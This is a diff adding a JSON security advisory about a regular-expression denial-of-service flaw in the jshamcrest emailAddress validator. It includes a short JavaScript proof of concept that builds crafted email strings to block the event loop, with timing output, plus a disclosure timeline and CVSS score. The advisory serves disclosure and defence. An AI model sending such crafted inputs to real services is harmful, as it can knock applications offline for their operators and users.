@@ -1,0 +1,19 @@
+{
+  "id": 53,
+  "created_at": "2015-10-25T17:21:21.82+00:00",
+  "updated_at": "2016-04-27T22:12:08+00:00",
+  "title": "Regular Expression Denial of Service",
+  "author": "Adam Baldwin",
+  "module_name": "jshamcrest",
+  "publish_date": "2016-01-05T23:05:18.308+00:00",
+  "cves": [],
+  "vulnerable_versions": "<=99.999.99999",
+  "patched_versions": "<0.0.0",
+  "slug": "jshamcrest_regular-expression-denial-of-service",
+  "overview": "jshamcrest is vulnerable to regular expression denial of service (ReDoS) when certain types of user input is passed in to the emailAddress validator.\n\n\"The Regular expression Denial of Service (ReDoS) is a Denial of Service attack, that exploits the fact that most Regular Expression implementations may reach extreme situations that cause them to work very slowly (exponentially related to input size). An attacker can then cause a program using a Regular Expression to enter these extreme situations and then hang for a very long time.\" [1]\n\n\n\n### Proof of concept\n\n```\nvar js = require('jshamcrest')\nvar emailAddress = new js.JsHamcrest.Matchers.emailAddress();\n\n\nvar genstr = function (len, chr) {\n    var result = \"\";\n    for (i=0; i<=len; i++) {\n        result = result + chr;\n    }\n\n    return result;\n}\n\n\nfor (i=1;i<=10000000;i=i+1) {\n    console.log(\"COUNT: \" + i);\n    var str = '66666666666666666666666666666@ffffffffffffffffffffffffffffffff.' + genstr(i, 'a') + '{'\n    console.log(\"LENGTH: \" + str.length);\n    var start = process.hrtime();\n    emailAddress.matches(str)\n\n    var end = process.hrtime(start);\n    console.log(end);\n}\n```\n\n### Results\nIt takes about 116 characters to get a 1.6 second event loop block.\n```\n[ 1, 633084590 ]\nCOUNT: 51\nLENGTH: 116\n```\n\n# Timeline\n- October 25, 2015 - Vulnerability Identified\n- October 25, 2015 - Maintainers notified (no response)",
+  "recommendation": "Do not pass untrusted user input into jshamcrest. Consider user a validator like joi that does not rely on regular expressions.",
+  "references": "- https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS",
+  "cvss_vector": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+  "cvss_score": 7.5,
+  "coordinating_vendor": "^Lift Security"
+}
